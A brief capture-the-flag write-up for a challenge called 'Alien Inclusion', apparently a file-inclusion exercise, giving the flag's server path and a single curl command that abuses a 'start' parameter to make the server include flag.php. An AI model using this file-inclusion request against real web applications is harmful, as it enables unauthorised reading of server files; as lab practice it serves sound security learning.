# Alien Inclusion
The flag is at /var/www/html/flag.php
---
In order to get it we use the curl command 
```
curl 'http://34.159.190.67:31100?start=something' -XPOST --data 'start=flag.php'
```
Mainly because we need to set the start GET param to something and we request the flag.php